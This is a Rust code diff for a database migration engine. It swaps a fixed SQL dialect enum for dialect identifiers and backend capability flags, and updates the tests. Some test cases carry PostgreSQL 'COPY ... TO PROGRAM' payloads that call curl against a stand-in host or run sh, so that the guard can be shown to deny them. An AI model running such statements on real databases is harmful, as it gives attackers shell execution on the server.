@@ -41,7 +41,7 @@ use crate::render::fold::{fold_ops, single_fold};
 use crate::render::lower::{IrAuthor, LiveSchema, LoweredArtifact};
 use crate::render::plan::AppliedPlan;
 use crate::render::step::{PlanStep, RenameStep};
-use crate::schema::query::SqlDialect;
+use zero_migrate_ir::dialect::DialectId;
 use zero_migrate_policy::EffectivePolicy;
 
 /// Sentinel touched-set entry meaning "this deploy touches a table I cannot
@@ -348,7 +348,7 @@ fn completed_artifact_steps(
 /// rerun path for a completed SQLite rename: the current catalog correctly lacks
 /// the old source column, while the historical view still has it.
 fn lower_completed_historical(
-    dialect: SqlDialect,
+    preserves_authored_logical_columns: bool,
     author: &IrAuthor,
     resolved_json: &str,
     app: &str,
@@ -357,7 +357,7 @@ fn lower_completed_historical(
     guard: &GuardConfig,
     journal: &[AppliedEntry],
 ) -> Result<Option<(LoweredArtifact, Vec<String>)>, EngineError> {
-    if dialect != SqlDialect::Sqlite {
+    if !preserves_authored_logical_columns {
         return Ok(None);
     }
     let Ok(artifact) =
@@ -377,21 +377,26 @@ fn refresh_historical_live(
     resolved: &MigrationIr,
     cumulative_ops: &[Op],
     policy: &EffectivePolicy,
-    dialect: SqlDialect,
+    dialect: &DialectId,
+    preserves_authored_logical_columns: bool,
+    projects_sdk_field_defs: bool,
     project: &str,
     app: &str,
 ) -> Result<(), String> {
-    if dialect == SqlDialect::Sqlite {
+    if preserves_authored_logical_columns {
         historical_live
             .advance_logical_columns(resolved, dialect, project, None)
             .map_err(|error| error.to_string())?;
     }
-    let logical_columns = historical_live.logical_columns.clone();
+    let logical_columns =
+        preserves_authored_logical_columns.then(|| historical_live.logical_columns.clone());
     let snapshot =
         fold_ops(cumulative_ops, dialect, project, policy).map_err(|error| error.to_string())?;
     *historical_live = LiveSchema::from_catalog_snapshot(snapshot, app);
-    if dialect == SqlDialect::Sqlite {
+    if let Some(logical_columns) = logical_columns {
         historical_live.logical_columns = logical_columns;
+    }
+    if projects_sdk_field_defs {
         // The SDK-shaped field map the 12-step rebuild renders its `CREATE TABLE` from,
         // as a PROJECTION of the single fold rather than a fourth replay of the op
         // stream (step 4 consumer 3 of `docs/proposals/single-fold-and-effects.md`
@@ -434,7 +439,7 @@ impl MigrationEngine {
         envelopes: &[MigrationIr],
         backend: &B,
         policy: &EffectivePolicy,
-        dialect: SqlDialect,
+        dialect: &DialectId,
         project: &str,
         app: &str,
         registry: &BTreeMap<String, String>,
@@ -480,7 +485,7 @@ impl MigrationEngine {
         envelopes: &[MigrationIr],
         backend: &B,
         policy: &EffectivePolicy,
-        dialect: SqlDialect,
+        dialect: &DialectId,
         project: &str,
         app: &str,
         registry: &BTreeMap<String, String>,
@@ -495,9 +500,11 @@ impl MigrationEngine {
         let mut historical_live = LiveSchema::default();
         let mut cumulative_ops: Vec<Op> = Vec::new();
         let mut effective_registry = registry.clone();
-        let guard = GuardConfig::from_policy(policy.clone(), dialect.id());
+        let guard = GuardConfig::from_policy(policy.clone(), dialect.clone());
         let author = IrAuthor::new(project, app, dialect, policy);
         let mut aggregate = AggregateOutcome::default();
+        let preserves_authored_logical_columns = backend.preserves_authored_logical_columns();
+        let projects_sdk_field_defs = backend.projects_sdk_field_defs();
 
         for envelope in envelopes {
             let migration_name = envelope.name.clone();
@@ -527,7 +534,7 @@ impl MigrationEngine {
                         aggregate.skipped.extend(skipped);
                         artifact.created_tables
                     } else if let Some((historical, skipped)) = lower_completed_historical(
-                        dialect,
+                        preserves_authored_logical_columns,
                         &author,
                         &resolved_json,
                         app,
@@ -561,7 +568,7 @@ impl MigrationEngine {
                 }
                 Err(current_error) => {
                     if let Some((historical, skipped)) = lower_completed_historical(
-                        dialect,
+                        preserves_authored_logical_columns,
                         &author,
                         &resolved_json,
                         app,
@@ -589,19 +596,23 @@ impl MigrationEngine {
             }
 
             cumulative_ops.extend(resolved.ops.iter().cloned());
-            if dialect == SqlDialect::Sqlite {
+            if preserves_authored_logical_columns || projects_sdk_field_defs {
                 refresh_historical_live(
                     &mut historical_live,
                     &resolved,
                     &cumulative_ops,
                     policy,
                     dialect,
+                    preserves_authored_logical_columns,
+                    projects_sdk_field_defs,
                     project,
                     app,
                 )
                 .map_err(|error| {
                     envelope_deploy_error(&migration_name, "historical schema projection", error)
                 })?;
+            }
+            if preserves_authored_logical_columns {
                 live.advance_logical_columns(&resolved, dialect, project, None)
                     .map_err(|error| {
                         envelope_deploy_error(
@@ -610,16 +621,18 @@ impl MigrationEngine {
                             error,
                         )
                     })?;
-                let logical_columns = live.logical_columns.clone();
-                // `SqliteBackend::snapshot_schema` delegates to the same SQLite
-                // catalog routine as its inherent `snapshot_schema_sqlite`; the
-                // trait call keeps this method generic over `B`.
-                let snapshot = backend
-                    .snapshot_schema(exec_cfg)
-                    .await
-                    .map_err(drift_to_engine_error)?;
-                live = LiveSchema::from_catalog_snapshot(snapshot, app);
+            }
+            let logical_columns =
+                preserves_authored_logical_columns.then(|| live.logical_columns.clone());
+            let snapshot = backend
+                .snapshot_schema(exec_cfg)
+                .await
+                .map_err(drift_to_engine_error)?;
+            live = LiveSchema::from_catalog_snapshot(snapshot, app);
+            if let Some(logical_columns) = logical_columns {
                 live.logical_columns = logical_columns;
+            }
+            if projects_sdk_field_defs {
                 // THE REBUILD LEG. This map is what `render/lower.rs`'s SQLite
                 // `renameColumn` hands the declarative differ, and what the 12-step
                 // rebuild's `CREATE TABLE` — the table every row is copied into — is
@@ -636,12 +649,6 @@ impl MigrationEngine {
                         )
                     })?
                     .project_field_defs();
-            } else {
-                let snapshot = backend
-                    .snapshot_schema(exec_cfg)
-                    .await
-                    .map_err(drift_to_engine_error)?;
-                live = LiveSchema::from_catalog_snapshot(snapshot, app);
             }
         }
 
@@ -1561,6 +1568,7 @@ impl MigrationEngine {
             let author = crate::render::expand_contract::ExpandContractAuthor::new(
                 exec_cfg.project_schema.clone(),
                 owner_app,
+                backend.dialect(),
             );
             let mut forward = author.author(&intent).map_err(|error| {
                 DeclarativeApplyError::Plain(EngineError::Apply(ApplyError::Backend(
@@ -1779,6 +1787,7 @@ impl MigrationEngine {
                         &obligation,
                         &templates,
                         resolution,
+                        &backend.dialect(),
                     )
                     .map_err(DeclarativeApplyError::Plain)?,
                 )]
@@ -2030,7 +2039,12 @@ impl MigrationEngine {
             // "is this deploy the legitimate contract-apply?" by the SAME
             // re-author-compare — no drift between the bundle-level pre-check and
             // the per-file apply.
-            recognizes_contract_apply(&exec_cfg.project_schema, pc, &ddl_up_by_version)
+            recognizes_contract_apply(
+                &exec_cfg.project_schema,
+                pc,
+                &ddl_up_by_version,
+                &backend.dialect(),
+            )
         };
         // The set of EXPAND trigger versions this plan RE-PRESENTS — a
         // `ExpandContract` step whose `pending_version` matches an outstanding
@@ -2365,6 +2379,7 @@ impl MigrationEngine {
                                     crate::render::expand_contract::ExpandContractAuthor::new(
                                         exec_cfg.project_schema.clone(),
                                         owner,
+                                        backend.dialect(),
                                     )
                                     .author(&intent)
                                     .map_err(|error| {
@@ -2376,6 +2391,7 @@ impl MigrationEngine {
                                     contract,
                                     &templates,
                                     crate::apply::journal::Resolution::Applied,
+                                    &backend.dialect(),
                                 )?;
                                 if let crate::approval::ApprovalScope::Versions(versions) =
                                     &mut batch_scope
@@ -2982,10 +2998,8 @@ impl MigrationEngine {
         backend: &B,
         exec_cfg: &ExecutorConfig,
     ) -> Result<(), DeclarativeApplyError> {
-        let (statement_setting, lock_setting) = match backend.dialect() {
-            SqlDialect::Sqlite => return Ok(()),
-            SqlDialect::Mysql => ("max_execution_time", "innodb_lock_wait_timeout"),
-            SqlDialect::Postgres => ("statement_timeout", "lock_timeout"),
+        let Some((statement_setting, lock_setting)) = backend.timeout_setting_names() else {
+            return Ok(());
         };
 
         let completed: std::collections::BTreeSet<String> = backend
@@ -3625,6 +3639,7 @@ fn atomic_pending_resolution_migration(
     obligation: &crate::apply::journal::PendingContract,
     templates: &[Migration],
     resolution: crate::apply::journal::Resolution,
+    dialect: &zero_migrate_ir::dialect::DialectId,
 ) -> Result<Migration, EngineError> {
     let mut migration =
         templates
@@ -3646,10 +3661,11 @@ fn atomic_pending_resolution_migration(
         }
     };
     let constraint_name = format!("zs_sync_{}", version.as_str().trim_start_matches("mig_"));
-    let table = crate::render::expand_contract::qualified(project_schema, &obligation.table);
-    let from = crate::render::expand_contract::quote_ident(&obligation.from_col);
-    let to = crate::render::expand_contract::quote_ident(&obligation.to_col);
-    let constraint = crate::render::expand_contract::quote_ident(&constraint_name);
+    let table =
+        crate::render::expand_contract::qualified(project_schema, &obligation.table, dialect);
+    let from = crate::render::expand_contract::quote_ident(&obligation.from_col, dialect);
+    let to = crate::render::expand_contract::quote_ident(&obligation.to_col, dialect);
+    let constraint = crate::render::expand_contract::quote_ident(&constraint_name, dialect);
     let mut statements = vec![
         format!(
             "ALTER TABLE {table} ADD CONSTRAINT {constraint} \
@@ -3710,6 +3726,7 @@ pub fn recognizes_contract_apply(
     project_schema: &str,
     pc: &crate::apply::journal::PendingContract,
     ddl_up_by_version: &std::collections::BTreeMap<&str, &str>,
+    dialect: &zero_migrate_ir::dialect::DialectId,
 ) -> bool {
     if pc.contract_versions.is_empty() {
         return false;
@@ -3721,6 +3738,7 @@ pub fn recognizes_contract_apply(
     let author = crate::render::expand_contract::ExpandContractAuthor::new(
         project_schema.to_string(),
         "discharge-recognize",
+        dialect.clone(),
     );
     let Ok(plan) = author.author(
         &crate::render::expand_contract::OnlineIntent::RenameColumn {
@@ -3968,7 +3986,7 @@ mod tests {
     fn guard_cfg() -> GuardConfig {
         GuardConfig::from_policy(
             crate::test_fixtures::no_inject("proj_acme"),
-            crate::SqlDialect::Postgres.id(),
+            zero_migrate_ir::dialect::POSTGRES,
         )
     }
 
@@ -3996,7 +4014,7 @@ mod tests {
     }
 
     fn det() -> DeterministicAuthor {
-        DeterministicAuthor::new("proj_acme", "app_acme")
+        DeterministicAuthor::new("proj_acme", "app_acme", zero_migrate_ir::dialect::POSTGRES)
     }
 
     #[test]
@@ -4084,9 +4102,13 @@ mod tests {
 
     #[test]
     fn plan_with_a_drop_is_destructive_and_requires_approval() {
-        let drop = RawSqlAuthor::new("app_acme", crate::test_fixtures::no_inject("proj_acme"))
-            .wrap("drop_legacy", "DROP TABLE \"proj_acme\".\"legacy\"", None)
-            .unwrap();
+        let drop = RawSqlAuthor::new(
+            "app_acme",
+            zero_migrate_ir::dialect::POSTGRES,
+            crate::test_fixtures::no_inject("proj_acme"),
+        )
+        .wrap("drop_legacy", "DROP TABLE \"proj_acme\".\"legacy\"", None)
+        .unwrap();
         let plan = MigrationEngine::new().plan(&[drop], &guard_cfg());
         assert!(plan.denied.is_empty(), "DROP is flagged, not denied");
         assert!(plan.destructive);
@@ -4098,13 +4120,17 @@ mod tests {
     #[test]
     fn plan_with_a_dangerous_up_records_a_denial() {
         // COPY … TO PROGRAM is shell RCE — hard-denied (not merely flagged).
-        let evil = RawSqlAuthor::new("app_acme", crate::test_fixtures::no_inject("proj_acme"))
-            .wrap(
-                "rce",
-                "COPY \"proj_acme\".\"t\" TO PROGRAM 'curl evil.test'",
-                None,
-            )
-            .unwrap();
+        let evil = RawSqlAuthor::new(
+            "app_acme",
+            zero_migrate_ir::dialect::POSTGRES,
+            crate::test_fixtures::no_inject("proj_acme"),
+        )
+        .wrap(
+            "rce",
+            "COPY \"proj_acme\".\"t\" TO PROGRAM 'curl evil.test'",
+            None,
+        )
+        .unwrap();
         let plan = MigrationEngine::new().plan(std::slice::from_ref(&evil), &guard_cfg());
         assert_eq!(
             plan.items.len(),
@@ -4118,7 +4144,11 @@ mod tests {
 
     #[test]
     fn plan_collects_every_denial_not_just_the_first() {
-        let raw = RawSqlAuthor::new("app_acme", crate::test_fixtures::no_inject("proj_acme"));
+        let raw = RawSqlAuthor::new(
+            "app_acme",
+            zero_migrate_ir::dialect::POSTGRES,
+            crate::test_fixtures::no_inject("proj_acme"),
+        );
         let a = raw
             .wrap("rce", "COPY \"proj_acme\".\"t\" TO PROGRAM 'sh'", None)
             .unwrap();
@@ -4132,14 +4162,15 @@ mod tests {
     #[test]
     fn expand_contract_rename_set_plans_with_zero_denials() {
         use crate::render::expand_contract::{ExpandContractAuthor, OnlineIntent};
-        let plan_in = ExpandContractAuthor::new("proj_acme", "app_acme")
-            .author(&OnlineIntent::RenameColumn {
-                table: "users".into(),
-                from: "email".into(),
-                to: "email_address".into(),
-                ty: "text".into(),
-            })
-            .expect("author");
+        let plan_in =
+            ExpandContractAuthor::new("proj_acme", "app_acme", zero_migrate_ir::dialect::POSTGRES)
+                .author(&OnlineIntent::RenameColumn {
+                    table: "users".into(),
+                    from: "email".into(),
+                    to: "email_address".into(),
+                    ty: "text".into(),
+                })
+                .expect("author");
         // The whole expand+contract set passes the guard with NO denials — the
         // dual-write fn (INVOKER plpgsql, project-qualified), the trigger, the
         // backfill marker, and the gated drops are all guard-safe.
